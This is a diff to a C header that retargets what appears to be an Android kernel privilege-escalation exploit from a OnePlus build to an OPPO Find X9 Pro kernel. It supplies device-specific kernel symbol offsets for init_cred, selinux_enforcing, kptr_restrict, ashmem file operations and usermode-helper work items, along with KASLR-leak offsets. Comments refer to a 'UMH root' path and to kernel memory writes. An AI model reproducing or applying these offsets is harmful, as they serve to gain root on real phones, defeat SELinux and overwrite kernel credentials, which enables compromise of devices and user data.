@@ -1,14 +1,17 @@
 #ifndef TARGET_H
 #define TARGET_H
 
-#define BUILD_VARIANT_LABEL "ghostlock_oneplus"
-#define BUILD_FINGERPRINT "oneplus/ghostlock"
+#define BUILD_VARIANT_LABEL "ghostlock_findx9pro"
+#define BUILD_FINGERPRINT "oppo/findx9pro"
 
 /* Kernel address space (VA_BITS=39) */
 #define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
+/* D9400/MT6993: bootloader places the image at physical 0x80000000, i.e. the
+ * image is mapped at phys == phys_offset. Confirmed on PLG110 via
+ * /proc/iomem "Kernel code" = 0x80010000 (_stext), _text 0x10000 lower. */
 #define P0_PHYS_OFFSET 0x80000000ULL
-#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL
+#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
 /* physmap on this SoC spans ~48GB (DDR ranks at high phys addrs) */
 #define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
 #define KERNELSNITCH_IDENTITY_END   0xffffff8c00000000ULL
@@ -16,41 +19,52 @@
 #define DIRECT_MAP_END 0xffffff9000000000ULL
 #define VMEMMAP_START 0xfffffffe00000000ULL
 
-/* Global symbol offsets (kallsyms) */
-#define INIT_TASK_OFF          0x0240cf00ULL
-#define INIT_CRED_OFF          0x02422c70ULL
-#define INIT_UTS_NS_OFF        0x02594d88ULL
-#define EMPTY_ZERO_PAGE_OFF    0x02635000ULL
-#define ROOT_TASK_GROUP_OFF    0x0263d580ULL
-#define SELINUX_ENFORCING_OFF  0x026894d0ULL
-#define KPTR_RESTRICT_OFF      0x0240b638ULL
-#define CAP_CAPABLE_ACTIVE_OFF 0x02683b30ULL
+/* Global symbol offsets (kallsyms) — OPPO Find X9 Pro / PLG110 /
+ * MT6993 / 6.12.23-android16-5-g82efd98459a2-ab14457512-4k
+ *
+ * These are the compile-time fallbacks used when no offsets.h entry matches
+ * (and by runtime_struct_offsets.h as its fallback constants). They must
+ * describe the primary target device, not another SoC — a fallback taken from
+ * a different kernel silently produces non-page-aligned KASLR bases and writes
+ * that land in unrelated RAM instead of faulting. */
+#define INIT_TASK_OFF          0x023ECF00ULL
+#define INIT_CRED_OFF          0x02402A68ULL
+#define INIT_UTS_NS_OFF        0x02574650ULL
+#define EMPTY_ZERO_PAGE_OFF    0x02614000ULL
+#define ROOT_TASK_GROUP_OFF    0x0261C580ULL
+#define SELINUX_ENFORCING_OFF  0x026684F0ULL
+#define KPTR_RESTRICT_OFF      0x023EB638ULL
+#define CAP_CAPABLE_ACTIVE_OFF 0x02662B50ULL
 #define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
-#define SELINUX_BLOB_SIZES_OFF 0x018464e8ULL
-#define SECURITY_HOOK_HEADS_OFF 0x01846480ULL
-#define KMALLOC_CACHES_OFF     0x018404c0ULL
-#define ANON_PIPE_BUF_OPS_OFF  0x0121ee48ULL
+#define SELINUX_BLOB_SIZES_OFF 0x0182F4E8ULL
+/* This kernel replaced the LSM hook list with static calls; 0 means "absent"
+ * and SECURITY_CAPABLE_HEAD is then never dereferenced (see root.c). */
+#define SECURITY_HOOK_HEADS_OFF 0ULL
+#define KMALLOC_CACHES_OFF     0x018294C0ULL
+#define ANON_PIPE_BUF_OPS_OFF  0x0120ED88ULL
 /* UMH root: workqueue symbol offsets (0 = not available, set per-device) */
-#define SYSTEM_UNBOUND_WQ_OFF              0ULL
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0ULL
-#define CONFIGFS_READ_ITER_OFF      0x005154acULL
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005156e0ULL
-#define COPY_SPLICE_READ_OFF   0x00491578ULL
-#define NOOP_LLSEEK_OFF        0x0043e8f4ULL
-#define ASHMEM_MISC_FOPS_OFF   0x0133b058ULL
-#define ASHMEM_FOPS_OFF        0x026b6a98ULL
-#define ASHMEM_IOCTL_OFF       0x00d85964ULL
-#define ASHMEM_COMPAT_IOCTL_OFF 0x00d85834ULL
-#define ASHMEM_MMAP_OFF        0x00d858b0ULL
-#define ASHMEM_OPEN_OFF        0x00d854b4ULL
-#define ASHMEM_RELEASE_OFF     0x00d85a04ULL
-#define ASHMEM_SHOW_FDINFO_OFF 0x00d8580cULL
+#define SYSTEM_UNBOUND_WQ_OFF              0x01829250ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x000F6744ULL
+#define CONFIGFS_READ_ITER_OFF      0x00511A7CULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00512028ULL
+#define COPY_SPLICE_READ_OFF   0x0048E034ULL
+#define NOOP_LLSEEK_OFF        0x0043B678ULL
+/* Rust ashmem driver on this kernel exposes no miscdevice fops table, so the
+ * UMH redirect path is unavailable by design. 0 is intentional, not a stub. */
+#define ASHMEM_MISC_FOPS_OFF   0ULL
+#define ASHMEM_FOPS_OFF        0x02695A88ULL
+#define ASHMEM_IOCTL_OFF       0x00D7E5A8ULL
+#define ASHMEM_COMPAT_IOCTL_OFF 0x00D7EB90ULL
+#define ASHMEM_MMAP_OFF        0x00D7EC0CULL
+#define ASHMEM_OPEN_OFF        0x00D7EC68ULL
+#define ASHMEM_RELEASE_OFF     0x00D7E668ULL
+#define ASHMEM_SHOW_FDINFO_OFF 0x00D7EB68ULL
 
 /* KASLR leak */
-#define SLIDE_NFULNL_LOGGER_OFF       0x024021a0ULL
-#define SLIDE_LOGGERS_0_1_OFF         0x024020f0ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x026aa868ULL
-#define SLIDE_SYSCTL_BOOTID_OFF       0x026aa868ULL
+#define SLIDE_NFULNL_LOGGER_OFF       0x023E2198ULL
+#define SLIDE_LOGGERS_0_1_OFF         0x023E20E8ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02689868ULL
+#define SLIDE_SYSCTL_BOOTID_OFF       0x02689868ULL
 
 /* Derived macros */
 #define INIT_TASK           (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
